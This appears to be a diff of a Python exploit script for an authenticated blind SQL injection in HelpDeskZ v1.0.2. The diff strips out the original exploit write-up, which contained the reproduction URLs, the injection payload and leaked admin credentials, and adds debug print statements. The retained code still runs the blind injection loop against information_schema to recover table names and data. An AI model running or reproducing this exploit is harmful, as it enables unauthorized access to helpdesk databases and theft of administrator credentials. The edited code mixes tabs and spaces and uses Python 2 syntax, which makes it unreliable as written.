@@ -1,60 +1,3 @@
-'''
-# Exploit Title: HelpDeskZ <= v1.0.2 - Authenticated SQL Injection / Unauthorized file download
-# Google Dork: intext:"Help Desk Software by HelpDeskZ", inurl:?v=submit_ticket
-# Date: 2017-01-30
-# Exploit Author: Mariusz Popławski, kontakt@deepsec.pl ( www.afine.pl )
-# Vendor Homepage: http://www.helpdeskz.com/
-# Software Link: https://github.com/evolutionscript/HelpDeskZ-1.0/archive/master.zip
-# Version: <= v1.0.2
-# Tested on:
-# CVE :
- 
-HelpDeskZ <= v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.
- 
-Software after ticket submit allow to download attachment by entering following link:
-http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1(ATTACHMENT_ID_HERE)
-
-FILE: view_tickets_controller.php
-LINE 95:	$attachment = $db->fetchRow("SELECT *, COUNT(id) AS total FROM ".TABLE_PREFIX."attachments WHERE id=".$db->real_escape_string($params[2])." AND ticket_id=".$params[0]." AND msg_id=".$params[3]);
-
-third argument AND msg_id=".$params[3]; sent to fetchRow query with out any senitization
-
- 
-Steps to reproduce:
- 
-http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1 or id>0 -- -
-
-
-by entering a valid id of param[] which is our submited ticket id and adding our query on the end of request we are able to download any uploaded attachment.
- 
-Call this script with the base url of your HelpdeskZ-Installation and put your submited ticket login data (EMAIL, PASSWORD)
-
-steps:
-1. go to http://192.168.100.115/helpdesk/?v=submit_ticket
-2. Submit a ticket with valid email (important we need password access).
-3. Add attachment to our ticket (important step as the attachment table may be empty, we need at least 1 attachment in db to valid our query).
-4. Get the password from email.
-4. run script
-
-root@kali:~/Desktop# python test.py http://192.168.100.115/helpdesk/ localhost@localhost.com password123
-
-where http://192.168.100.115/helpdesk/ = base url to helpdesk
-localhost@localhost.com = email which we use to submit the ticket
-password123 = password that system sent to our email
-
-Output of script:
-root@kali:~/Desktop# python test.py http://192.168.100.115/helpdesk localhost@localhost.com password123
-2017-01-30T09:50:16.426076   GET   http://192.168.100.115/helpdesk
-2017-01-30T09:50:16.429116   GET   http://192.168.100.115/helpdesk/
-2017-01-30T09:50:16.550654   POST   http://192.168.100.115/helpdesk/?v=login
-2017-01-30T09:50:16.575227   GET   http://192.168.100.115/helpdesk/?v=view_tickets
-2017-01-30T09:50:16.674929   GET   http://192.168.100.115/helpdesk?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=1%20or%201=1%20and%20ascii(substr((SeLeCt%20table_name%20from%20information_schema.columns%20where%20table_name%20like%20'%staff'%20%20limit%200,1),1,1))%20=%20%2047%20--%20-
-...
-------------------------------------------
-username: admin
-password: sha256(53874ea55571329c04b6998d9c7772c9274d3781)
-
-'''           
 import requests
 import sys
 
@@ -90,8 +33,8 @@ def get_ticket_id(content):
 def main():
 
     # Start a session so we can have persistant cookies
-	session = requests.session(config={'verbose': sys.stderr})
-
+	session = requests.session()
+        print URL
 	r = session.get(URL+"")
 	
 	#GET THE TOKEN TO LOGIN
@@ -112,6 +55,8 @@ def main():
 	r = session.post(URL+"/?v=login", data=login_data)
     #GET  ticketid
 	ticket_id = get_ticket_id(r.content)
+        print "ticket_id:"
+        print ticket_id
         if(ticket_id=="error"):
                 print "ticketid not found, open a ticket first"
 		exit()
@@ -123,6 +68,7 @@ def main():
         while(char!=123):
                 target_prefix = target+ " or 1=1 and ascii(substr((SeLeCt table_name from information_schema.columns where table_name like '%staff'  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                 response = session.get(target_prefix).content
+                print response
                 if "couldn't find" not in response:
                         prefix.append(char)
                         limit=limit+1
